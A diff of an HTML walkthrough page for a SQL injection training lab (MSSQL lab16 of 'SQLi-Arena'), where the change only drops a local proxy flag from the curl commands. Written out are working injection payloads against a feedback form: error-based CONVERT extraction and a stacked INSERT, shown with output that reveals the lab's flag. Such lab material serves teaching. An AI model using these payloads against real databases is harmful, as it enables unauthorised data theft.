@@ -7,7 +7,7 @@
         <span class="terminal-title">Step 1. Normal Feedback Submission</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab16" \<br> --data-urlencode "name=testuser" --data-urlencode "comment=hello world"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab16" \<br> --data-urlencode "name=testuser" --data-urlencode "comment=hello world"<br><br>
         <span class="prompt">Name: </span>testuser<br>
         <span class="prompt">Comment: </span>hello world<br>
         <span class="prompt">SQL: </span>INSERT INTO feedback (author, comment) OUTPUT INSERTED.id, INSERTED.author, INSERTED.comment VALUES ('testuser', 'hello world')<br><br>
@@ -26,7 +26,7 @@
         <span class="terminal-title">Step 2. Error Confirmation</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab16" \<br> --data-urlencode "name=test" --data-urlencode "comment='"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab16" \<br> --data-urlencode "name=test" --data-urlencode "comment='"<br><br>
         <span class="prompt">Name: </span>test<br>
         <span class="prompt">Comment: </span>'<br>
         <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: Unclosed quotation mark after the character string '')'.</strong>
@@ -44,7 +44,7 @@
         <span class="terminal-title">Step 3. CONVERT Error Extraction</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab16" \<br> --data-urlencode "name=test" \<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab16" \<br> --data-urlencode "name=test" \<br>
         &nbsp;&nbsp;--data-urlencode "comment=' + CONVERT(VARCHAR, CONVERT(INT, (SELECT TOP 1 flag FROM flags))) + '"<br><br>
         <span class="prompt">Name: </span>test<br>
         <span class="prompt">Comment: </span>' + CONVERT(VARCHAR, CONVERT(INT, (SELECT TOP 1 flag FROM flags))) + '<br>
@@ -63,7 +63,7 @@
         <span class="terminal-title">Step 4. Stacked INSERT</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab16" \<br> --data-urlencode "name=test" \<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab16" \<br> --data-urlencode "name=test" \<br>
         &nbsp;&nbsp;--data-urlencode "comment=test'); INSERT INTO feedback (author, comment) SELECT 'LEAKED', flag FROM flags; -- -"<br><br>
         <span class="prompt">Name: </span>test<br>
         <span class="prompt">Comment: </span>test'); INSERT INTO feedback (author, comment) SELECT 'LEAKED', flag FROM flags; -- -<br><br>
@@ -106,7 +106,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab16" \<br> --data-urlencode "name=test" \<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab16" \<br> --data-urlencode "name=test" \<br>
         &nbsp;&nbsp;--data-urlencode "comment=' + CONVERT(VARCHAR, CONVERT(INT, (SELECT TOP 1 flag FROM flags))) + '"<br><br>
         <span class="prompt">Output: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_1ns3rt_0utput_cl4us3}' to data type int.</strong>
     </div>
